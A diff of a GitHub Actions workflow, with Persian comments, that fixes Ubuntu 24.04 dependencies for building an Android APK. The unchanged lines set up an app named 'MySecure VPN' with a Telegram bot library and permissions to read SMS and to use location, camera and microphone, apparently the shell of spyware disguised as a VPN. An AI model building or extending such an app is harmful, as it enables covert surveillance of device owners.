@@ -17,20 +17,23 @@ jobs:
       with:
         python-version: '3.12'
 
-    - name: نصب مواد (با فیکس libtinfo5 و Cython quote)
+    - name: نصب مواد (با فیکس libtinfo5 و libffi6 برای 24.04)
       run: |
         set -e  # متوقف شو اگر ارور
         sudo apt update -qq  # بروزرسانی ساکت
-        # نصب دستی libtinfo5 (از jammy-security برای 24.04)
+        # نصب دستی libtinfo5 (از jammy-security)
         wget http://security.ubuntu.com/ubuntu/pool/universe/n/ncurses/libtinfo5_6.3-2ubuntu0.1_amd64.deb
         sudo dpkg -i libtinfo5_6.3-2ubuntu0.1_amd64.deb
-        # حالا deps اصلی
+        # نصب دستی libffi6 (از jammy برای 24.04)
+        wget http://archive.ubuntu.com/ubuntu/pool/main/libf/libffi/libffi6_3.4.2-1ubuntu1_amd64.deb
+        sudo dpkg -i libffi6_3.4.2-1ubuntu1_amd64.deb
+        # deps اصلی (libffi6 رو حذف کردیم چون دستی نصب شد)
         sudo apt install -y --no-install-recommends git zip unzip openjdk-17-jdk-headless python3-pip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev cmake libffi-dev libssl-dev
         pip install --upgrade pip setuptools wheel
-        pip install "Cython<3.0" virtualenv buildozer  # نقل قول برای version – فیکس redirection
+        pip install "Cython<3.0" virtualenv buildozer  # Cython با نقل قول
         sudo apt update -qq  # دوباره برای deps Kivy
-        sudo apt install -y --no-install-recommends build-essential libsqlite3-dev sqlite3 bzip2 libbz2-dev zlib1g-dev libssl-dev openssl libgdbm-dev libgdbm-compat-dev liblzma-dev libreadline-dev libncursesw5-dev libffi-dev uuid-dev libffi6 libgl1-mesa-dev libgles2-mesa-dev
-        echo "نصب deps تموم شد – Cython و buildozer OK"
+        sudo apt install -y --no-install-recommends build-essential libsqlite3-dev sqlite3 bzip2 libbz2-dev zlib1g-dev libssl-dev openssl libgdbm-dev libgdbm-compat-dev liblzma-dev libreadline-dev libncursesw5-dev libffi-dev uuid-dev libgl1-mesa-dev libgles2-mesa-dev
+        echo "نصب deps تموم شد – libtinfo5 و libffi6 OK"
 
     - name: بپز APK
       run: |
@@ -38,7 +41,7 @@ jobs:
         sed -i 's/title = My Application/title = MySecure VPN/' buildozer.spec
         sed -i 's/package.name = myapp/package.name = mysecurevpn/' buildozer.spec
         sed -i 's/package.domain = org.example/package.domain = org.example.vpn/' buildozer.spec
-        sed -i 's/requirements = python3,kivy/requirements = python3,kivy==2.1.0,plyer,pyTelegramBotAPI,requests/' buildozer.spec  # Kivy پایدار
+        sed -i 's/requirements = python3,kivy/requirements = python3,kivy==2.1.0,plyer,pyTelegramBotAPI,requests/' buildozer.spec
         sed -i 's/android.permissions = INTERNET/android.permissions = INTERNET,ACCESS_FINE_LOCATION,CAMERA,RECORD_AUDIO,READ_SMS,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE/' buildozer.spec
         sed -i 's/android.api = 27/android.api = 33/' buildozer.spec
         sed -i 's/android.minapi = 21/android.minapi = 21/' buildozer.spec
